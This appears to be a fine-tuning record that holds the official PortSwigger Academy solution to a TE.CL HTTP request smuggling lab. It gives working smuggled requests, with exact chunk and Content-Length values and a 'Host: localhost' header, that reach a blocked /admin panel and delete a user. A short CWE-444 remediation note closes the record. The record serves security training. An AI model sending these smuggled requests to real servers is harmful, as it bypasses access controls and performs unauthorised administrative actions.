# SMUGGLING — portswigger_labs_sft

- source: portswigger_labs_sft
- class: smuggling
- cwe: CWE-444

## Scenario

Teach me the official solution for this PortSwigger Academy lab.

Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Topic: HTTP request smuggling
Level: Practitioner

Scenario:
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

Note

 Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Analysis / Response

This PortSwigger Web Security Academy lab (Practitioner) covers HTTP request smuggling: "Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability".

## Solution steps

1. Try to visit `/admin` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0` Note You need to include the trailing sequence `\r\n\r\n` following the final `0`.
4. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
5. Issue the following request twice: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete `carlos`: `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`

## Vulnerability note

Underlying issue: HTTP request smuggling (CWE-444). Use a consistent, well-configured front-end/back-end HTTP stack; reject ambiguous Transfer-Encoding/Content-Length combinations.
